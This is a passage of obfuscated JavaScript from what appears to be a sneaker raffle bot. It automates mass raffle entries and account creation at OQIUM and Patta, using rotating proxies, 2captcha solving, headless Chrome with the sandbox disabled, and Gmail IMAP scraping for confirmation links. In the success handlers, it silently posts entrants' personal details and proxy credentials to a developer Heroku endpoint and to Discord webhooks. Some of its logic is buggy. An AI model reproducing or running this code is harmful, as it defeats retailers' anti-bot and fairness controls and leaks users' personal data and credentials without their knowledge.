                                var _0xf6575c = Math['round'](Math['random']() * (_0x5a39fa['length'] - 0x1)), _0xf24474 = _0x5a39fa[_0xf6575c]['split'](':');
                            var _0x4eeda0 = {
                                'jar': _0x5037e5,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x138af2['url'],
                                'headers': _0x138af2['headers'],
                                'body': JSON['stringify'](_0x13b602),
                                'proxy': 'http://' + _0xf24474[0x2] + ':' + _0xf24474[0x3] + '@' + _0xf24474[0x0] + ':' + _0xf24474[0x1]
                            };
                            return _0x3b1313 != 'ver' && (_0x4eeda0['url'] = _0x138af2['url'], _0x4eeda0['headers'] = _0x138af2['headers']), _0x3b1313 == 'ver' && (_0x4eeda0['method'] = 'GET'), new Promise(function (_0x5070cd, _0x5d15ba) {
                                callback = async (_0x10454b, _0x364766, _0x11e73e) => {
                                    if (!_0x10454b && _0x364766['statusCode'] == 0xca || !_0x10454b && _0x364766['statusCode'] == 0xc8) {
                                        if (_0x3b1313 != 'ver') {
                                            var _0x28696b = await _0x4808d0(_0x48e566[_0x19cb12], _0x138af2, 'dev', ![]), _0xbcea6 = await _0x4808d0(_0x48e566[_0x19cb12], _0x138af2, 'pub', ![]);
                                            const _0x44ea32 = {
                                                'succesDEVMSG': { 'embeds': [_0x28696b] },
                                                'succesPUBMSG': { 'embeds': [_0xbcea6] }
                                            };
                                            let _0x33ccb7 = _0x48e566[_0x19cb12];
                                            try {
                                                prxdata = {
                                                    'username': _0xeaf750['replace']('#', ''),
                                                    'module': _0x138af2['name'],
                                                    'entrydata': JSON['stringify'](_0x33ccb7),
                                                    'proxy': '' + _0x5a39fa[_0x19cb12]
                                                };
                                                var _0x562e61 = JSON['stringify'](prxdata);
                                                let _0x354bb6 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x562e61, _0x354bb6);
                                            } catch (_0x4ec718) {
                                            }
                                            if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                                                try {
                                                    await _0x21ec0c(_0x409619['webhook'], _0x44ea32['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x44ea32['succesDEVMSG']), await _0x50b4f8(0xc8);
                                            try {
                                                await _0x21ec0c(_0x171aec, _0x44ea32['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x1474be(_0x48e566[_0x19cb12], _0x138af2);
                                        }
                                        _0x5070cd(console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x138af2['name'] + ']\x20Task\x20' + (_0x19cb12 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3b1313 != 'ver') {
                                            var _0x2f4de7 = '' + _0x10454b, _0x3ab047 = await _0x4808d0(_0x48e566[_0x19cb12], _0x138af2, 'dev', !![], _0x2f4de7), _0x4bec3f = {};
                                            _0x4bec3f['errorDEV'] = { 'embeds': [_0x3ab047] }, _0x61dfa6(_0x48e566[_0x19cb12], _0x138af2), _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x4bec3f['errorDEV']), await _0x21ec0c(_0x451f96, _0x4bec3f['errorDEV']);
                                        }
                                        _0x5d15ba(console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x138af2['name'] + ']\x20Task\x20' + (_0x19cb12 + 0x1) + ':\x20' + _0x10454b)));
                                    }
                                };
                                try {
                                    _0x3b1313 != 'ver' && console['log'](_0x3996da() + '\x20[' + _0x138af2['name'] + ']\x20Task\x20' + (_0x19cb12 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x13b602['data']['attributes']['email']), _0x2131de(_0x4eeda0, callback);
                                } catch (_0x90a70) {
                                    console['log'](_0x3996da() + '\x20Task\x20' + (_0x19cb12 + 0x1) + ':\x20' + _0x90a70);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x484d71(_0x484c01, 'nor', _0x338c64, _0x41acbb, _0x365d4d), console['log'](_0x3996da() + '\x20[' + _0x338c64['name'] + ']\x20Sleeping\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        } catch (_0x3ab85e) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2c55e2, _0x252134, _0x4ff8db) {
                    var _0x252134 = [], _0x5670d0 = ![];
                    async function _0x16fb68() {
                        var _0x4b81c3 = new _0x51510b({
                            'user': _0x409619['masterMail'],
                            'password': _0x409619['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4d1b60(_0x191f7c) {
                            _0x4b81c3['openBox']('INBOX', ![], _0x191f7c);
                        }
                        _0x4b81c3['once']('ready', function () {
                            _0x4d1b60(function (_0x5ceac9, _0x2e426f) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5ceac9)
                                    throw _0x5ceac9;
                                _0x4b81c3['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x169147, _0x5d5b34) {
                                    if (!_0x5d5b34 || !_0x5d5b34['length'])
                                        console['log'](_0x3996da() + '\x20[' + _0x2c55e2['name'] + ']\x20No\x20mails\x20found'), _0x4b81c3['end']();
                                    else {
                                        var _0x120459 = _0x4b81c3['seq']['fetch'](_0x5d5b34, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x120459['on']('message', function (_0x35e059, _0x3ee775) {
                                            var _0x3a31d7 = '(#' + _0x3ee775 + ')\x20';
                                            _0x35e059['on']('body', function (_0x23b0d9, _0x2d43d7) {
                                                _0x3f1b1e(_0x23b0d9, (_0x2f218c, _0x3fbc85) => {
                                                    var _0x48acee = _0x3fbc85['text']['split']('(')[0x1], _0x312c4f = _0x48acee['split'](')')[0x0];
                                                    _0x252134['push'](_0x312c4f);
                                                });
                                            }), _0x35e059['once']('end', function () {
                                            });
                                        }), _0x120459['once']('error', function (_0x30d229) {
                                            console['log']('Fetch\x20error:\x20' + _0x30d229), _0x5670d0 = !![];
                                        }), _0x120459['once']('end', function () {
                                            _0x4b81c3['end'](), _0x5670d0 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x4b81c3['once']('error', function (_0x166776) {
                            console['log'](_0x166776), _0x5670d0 = !![];
                        }), _0x4b81c3['once']('end', async function () {
                            _0x5670d0 = !![];
                        }), _0x4b81c3['connect']();
                    }
                    async function _0x5f9cdf(_0x54d85c, _0x50a408, _0x4cdb70) {
                        for (var _0x8c9c9a = 0x0; _0x8c9c9a < _0x50a408['length']; _0x8c9c9a++) {
                            async function _0x263c97(_0x8ebf28, _0x15bb22, _0x505f82, _0x220f5b, _0x243032) {
                                var _0x3668c9, _0xd15f55 = {}, _0x26da4a = [], _0x42f794 = {}, _0x367b58 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x49da25 = Math['round'](Math['random']() * (_0x367b58['length'] - 0x1));
                                _0x220f5b[_0x8ebf28]['Size'] == 'RANDOM' && (_0x220f5b[_0x8ebf28]['Size'] = _0x367b58[_0x49da25]);
                                !_0x220f5b && (_0x220f5b = {});
                                if (_0x409619['useRandomProxy'] = ![])
                                    var _0x1d9780 = _0x243032[_0x8ebf28]['split'](':');
                                else
                                    var _0x2a0a63 = Math['round'](Math['random']() * (_0x243032['length'] - 0x1)), _0x1d9780 = _0x243032[_0x2a0a63]['split'](':');
                                var _0x2dcbab = {
                                    'jar': _0x5037e5,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x505f82['url'],
                                    'headers': _0x505f82['headers'],
                                    'body': JSON['stringify'](_0xd15f55),
                                    'proxy': 'http://' + _0x1d9780[0x2] + ':' + _0x1d9780[0x3] + '@' + _0x1d9780[0x0] + ':' + _0x1d9780[0x1]
                                };
                                return _0x15bb22 != 'ver' && (_0x2dcbab['url'] = _0x505f82['url'], _0x2dcbab['headers'] = _0x505f82['headers']), _0x15bb22 == 'ver' && (_0x2dcbab['method'] = 'GET', _0x2dcbab['url'] = _0x220f5b[_0x8ebf28]), new Promise(function (_0x165a53, _0x34045d) {
                                    callback = async (_0x4f2df6, _0xb9f1f1, _0x33d3e9) => {
                                        if (!_0x4f2df6 && _0xb9f1f1['statusCode'] == 0xca || !_0x4f2df6 && _0xb9f1f1['statusCode'] == 0xc8) {
                                            if (_0x15bb22 != 'ver') {
                                                var _0x3708b6 = await _0x4808d0(_0x220f5b[_0x8ebf28], _0x505f82, 'dev', ![]), _0x54f223 = await _0x4808d0(_0x220f5b[_0x8ebf28], _0x505f82, 'pub', ![]);
                                                const _0x1e7d4f = {
                                                    'succesDEVMSG': { 'embeds': [_0x3708b6] },
                                                    'succesPUBMSG': { 'embeds': [_0x54f223] }
                                                };
                                                if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                                                    try {
                                                        await _0x21ec0c(_0x409619['webhook'], _0x1e7d4f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x1e7d4f['succesDEVMSG']), await _0x50b4f8(0xc8);
                                                try {
                                                    await _0x21ec0c(_0x171aec, _0x1e7d4f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1474be(_0x220f5b[_0x8ebf28], _0x505f82);
                                            }
                                            _0x165a53(console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x505f82['name'] + ']\x20Task\x20' + (_0x8ebf28 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x15bb22 != 'ver') {
                                                var _0x48a07c = '' + _0x4f2df6, _0x17d575 = await _0x4808d0(_0x220f5b[_0x8ebf28], _0x505f82, 'dev', !![], _0x48a07c), _0x244337 = {};
                                                _0x244337['errorDEV'] = { 'embeds': [_0x17d575] }, _0x61dfa6(_0x220f5b[_0x8ebf28], _0x505f82), _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x244337['errorDEV']), await _0x21ec0c(_0x451f96, _0x244337['errorDEV']);
                                            }
                                            _0x34045d(console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x505f82['name'] + ']\x20Task\x20' + (_0x8ebf28 + 0x1) + ':\x20' + _0x4f2df6)));
                                        }
                                    };
                                    try {
                                        _0x15bb22 != 'ver' ? console['log'](_0x3996da() + '\x20[' + _0x505f82['name'] + ']\x20Task\x20' + (_0x8ebf28 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xd15f55['data']['attributes']['email']) : console['log'](_0x3996da() + '\x20[' + _0x505f82['name'] + ']\x20Task\x20' + (_0x8ebf28 + 0x1) + ':\x20Fetching\x20Response'), _0x2131de(_0x2dcbab, callback);
                                    } catch (_0x10c2f1) {
                                        console['log'](_0x3996da() + '\x20Task\x20' + (_0x8ebf28 + 0x1) + ':\x20' + _0x10c2f1);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x263c97(_0x8c9c9a, 'ver', _0x54d85c, _0x50a408, _0x4cdb70), console['log'](_0x3996da() + '\x20[' + _0x54d85c['name'] + ']\x20Sleeping\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                            } catch (_0x3da193) {
                            }
                        }
                    }
                    try {
                        _0x16fb68();
                        while (!_0x5670d0) {
                            await _0x50b4f8(0xfa0);
                        }
                        console['log']('Found\x20' + _0x252134['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5f9cdf(_0x2c55e2, _0x252134, _0x4ff8db);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0xe048f9, _0x31b353, _0x3f7abb) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4ea506 = 0x0; _0x4ea506 < _0x31b353['length']; _0x4ea506++) {
                        var _0x4b635e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xeaf750
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x409619['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x41a50b
                                }
                            ]
                        }];
                        const _0x45861d = { 'embeds': _0x4b635e };
                        _0x5b3b18(_0xe048f9['name'] + '\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20/\x20' + _0x31b353['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        try {
                            await _0x5a027c(_0x31b353, _0x4ea506);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x538369 = await _0x4808d0(_0x31b353[_0x4ea506], _0xe048f9, 'acc', ![]);
                        const _0xffb4ea = { 'succesDEVMSG': { 'embeds': [_0x538369] } };
                        if (_0x31b353[_0x4ea506]['Email'] == '' || _0x31b353[_0x4ea506]['FirstName'] == '' || _0x31b353[_0x4ea506]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x50b4f8(0x7d0);
                            continue;
                        }
                        (_0x31b353[_0x4ea506]['Password'] == '' || _0x31b353[_0x4ea506] == undefined) && _0x31b353[_0x4ea506]['Password'] == 'JRaffles23!';
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0x234982 = _0x3f7abb[_0x4ea506]['split'](':');
                        else
                            var _0x242773 = Math['round'](Math['random']() * (_0x3f7abb['length'] - 0x1)), _0x234982 = _0x3f7abb[_0x242773]['split'](':');
                        var _0x2acbb3;
                        try {
                            _0x2acbb3 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x234982[0x0] + ':' + _0x234982[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2acbb3 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x234982[0x0] + ':' + _0x234982[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5a36da = await _0x2acbb3['newPage']();
                            await _0x5a36da['authenticate']({
                                'username': '' + _0x234982[0x2],
                                'password': '' + _0x234982[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0xe048f9['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a36da['setRequestInterception'](!![]), _0x5a36da['on']('request', _0x48d0bc => {
                                _0x48d0bc['resourceType']() === 'image' || _0x48d0bc['resourceType']() === 'font' || _0x48d0bc['resourceType']() === 'media' ? _0x48d0bc['abort']() : _0x48d0bc['continue']();
                            }), await _0x5a36da['goto']('https://patta.nl/account/register'), await _0x50b4f8(0xbb8), await _0x5a36da['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3996da() + '\x20[' + _0xe048f9['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20Filling\x20information'), await _0x5a36da['type']('#RegisterForm-FirstName', '' + _0x31b353[_0x4ea506]['FirstName']), await _0x50b4f8(0x226), await _0x5a36da['type']('#RegisterForm-LastName', '' + _0x31b353[_0x4ea506]['LastName']), await _0x50b4f8(0x226), await _0x5a36da['type']('#RegisterForm-email', '' + _0x31b353[_0x4ea506]['Email']), await _0x50b4f8(0x226), await _0x5a36da['type']('#RegisterForm-password', '' + _0x31b353[_0x4ea506]['Password']), await _0x50b4f8(0x226), console['log'](_0x3996da() + '\x20[' + _0xe048f9['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20Submitting..'), await _0x5a36da['$eval']('#RegisterForm', _0x3e50a3 => _0x3e50a3['submit']()), await _0x50b4f8(0x1f40);
                            try {
                                await _0x5a36da['waitForSelector']('.home-page-grid__collection'), await _0x50b4f8(0x1f4), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0xe048f9['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20Account\x20' + _0x31b353[_0x4ea506]['Email'] + '\x20Generated!')), _0x39c9ee['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x31b353[_0x4ea506]['Email'] + ',' + _0x31b353[_0x4ea506]['Password']), console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0xe048f9['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20Account\x20' + _0x31b353[_0x4ea506]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0xffb4ea['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21ec0c(_0x3213ac, _0xffb4ea['succesDEVMSG']);
                            } catch (_0x334612) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x334612));
                            }
                        } catch (_0x1942b7) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x4ea506 + 0x1) + '\x20:\x20' + _0x1942b7));
                        } finally {
                            _0x2acbb3 && _0x2acbb3['close'](), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3068c5, _0x380169, _0x1d8d38) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x398adb = 0x0; _0x398adb < _0x380169['length']; _0x398adb++) {
                        var _0x460887;
                        if (_0x54fa01 != 'yes')
                            var _0x54fa01 = '', _0x651d55 = 0x0;
                        _0x5b3b18(_0x3068c5['name'] + '\x20Task\x20' + (_0x398adb + 0x1) + '\x20/\x20' + _0x380169['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        try {
                            await _0x5a027c(_0x380169, _0x398adb);
                        } catch {
                            _0x54fa01 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x380169[_0x398adb]['Email'] == '' || _0x380169[_0x398adb]['Password'] == '' || _0x380169[_0x398adb]['FirstName'] == '' || _0x380169[_0x398adb]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0x46b559 = _0x1d8d38[_0x398adb]['split'](':');
                        else
                            var _0x17fcf7 = Math['round'](Math['random']() * (_0x1d8d38['length'] - 0x1)), _0x46b559 = _0x1d8d38[_0x17fcf7]['split'](':');
                        var _0x1548ed;
                        try {
                            _0x1548ed = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x46b559[0x0] + ':' + _0x46b559[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1548ed = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x46b559[0x0] + ':' + _0x46b559[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4a0bf3 = await _0x1548ed['newPage']();
                            await _0x4a0bf3['authenticate']({
                                'username': '' + _0x46b559[0x2],
                                'password': '' + _0x46b559[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a0bf3['setRequestInterception'](!![]), _0x4a0bf3['on']('request', _0x2db216 => {
                                _0x2db216['resourceType']() === 'image' || _0x2db216['resourceType']() === 'font' || _0x2db216['resourceType']() === 'media' ? _0x2db216['abort']() : _0x2db216['continue']();
                            }), await _0x4a0bf3['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4a0bf3['waitForSelector']('#CustomerEmail'), console['log'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4a0bf3['type']('#CustomerEmail', '' + _0x380169[_0x398adb]['Email']), await _0x50b4f8(0x12c), await _0x4a0bf3['type']('#CustomerPassword', '' + _0x380169[_0x398adb]['Password']), await _0x50b4f8(0x226), await _0x4a0bf3['$eval']('#customer_login', _0x2a5a8f => _0x2a5a8f['submit']());
                            try {
                                await _0x4a0bf3['waitForSelector']('#orders'), await _0x50b4f8(0x4b0);
                            } catch {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4a0bf3['goto']('' + _0x380169[_0x398adb]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x50b4f8(0xbb8), console['log'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4a0bf3['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x4a0bf3['type']('#email', '' + _0x380169[_0x398adb]['Email']), await _0x50b4f8(0x384), await _0x4a0bf3['type']('#first_name', '' + _0x380169[_0x398adb]['FirstName']), await _0x50b4f8(0x514), await _0x4a0bf3['type']('#last_name', '' + _0x380169[_0x398adb]['LastName']), await _0x50b4f8(0x514), await _0x4a0bf3['type']('#street_address', _0x380169[_0x398adb]['Address1'] + '\x20' + _0x380169[_0x398adb]['HouseNumber'] + '\x20' + _0x380169[_0x398adb]['Address2']), await _0x50b4f8(0x2bc);
                            _0x380169[_0x398adb]['Postcode'] == undefined && (_0x380169[_0x398adb]['Postcode'] = _0x380169[_0x398adb]['Zip']);
                            await _0x4a0bf3['type']('#zip_code', '' + _0x380169[_0x398adb]['Postcode']), await _0x50b4f8(0x320), await _0x4a0bf3['type']('#city', '' + _0x380169[_0x398adb]['City']), await _0x50b4f8(0x320), await _0x4a0bf3['type']('#bday', '01/01/1994'), await _0x50b4f8(0x320), await _0x4a0bf3['type']('#instagram', '' + _0x380169[_0x398adb]['Follower']), await _0x50b4f8(0x352);
                            if (_0x380169[_0x398adb]['Size'] == 'RANDOM') {
                                const _0x2c645f = await _0x4a0bf3['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x4f0aeb => {
                                    return _0x4f0aeb['map'](_0x4fa8b1 => _0x4fa8b1['textContent']);
                                });
                                var _0x3f0048 = Math['round'](Math['random']() * (_0x2c645f['length'] - 0x1));
                                console['log'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2c645f[_0x3f0048]), await _0x4a0bf3['click']('label[data-eu-size=\x22' + _0x2c645f[_0x3f0048] + '\x22]');
                            } else {
                                console['log'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x380169[_0x398adb]['Size']);
                                try {
                                    await _0x4a0bf3['click']('label[data-eu-size=\x22' + _0x380169[_0x398adb]['Size'] + '\x22]');
                                } catch {
                                    await _0x4a0bf3['click']('label[data-eu-size=\x22' + _0x380169[_0x398adb]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x50b4f8(0xbb8), await _0x4a0bf3['$$eval']('.raffle__checkbox-label', _0x28cdc3 => _0x28cdc3['forEach'](_0x27da1f => _0x27da1f['click']())), await _0x50b4f8(0x7d0), console['log'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4a0bf3['click']('#raffle__form-submit'), await _0x50b4f8(0x1388);
                            try {
                                await _0x4a0bf3['waitForSelector']('#raffle__confirmation-message-container'), _0x54fa01 = 'no', _0x1474be(_0x380169[_0x398adb], _0x3068c5), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x463f9d = _0x380169[_0x398adb];
                                try {
                                    prxdata = {
                                        'username': _0xeaf750['replace']('#', ''),
                                        'module': _0x3068c5['name'],
                                        'entrydata': JSON['stringify'](_0x463f9d),
                                        'proxy': '' + _0x1d8d38[_0x398adb]
                                    };
                                    var _0x1a007b = JSON['stringify'](prxdata);
                                    let _0xcc67dd = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x1a007b, _0xcc67dd);
                                } catch (_0xeffc00) {
                                }
                            } catch (_0x583345) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x583345));
                            }
                        } catch (_0x445cdf) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20' + _0x445cdf)), _0x54fa01 = 'yes';
                        } finally {
                            _0x1548ed && _0x1548ed['close']();
                            if (_0x54fa01 == 'yes' && _0x651d55 != 0x5 && _0x460887 != 'Size\x20Not\x20Found') {
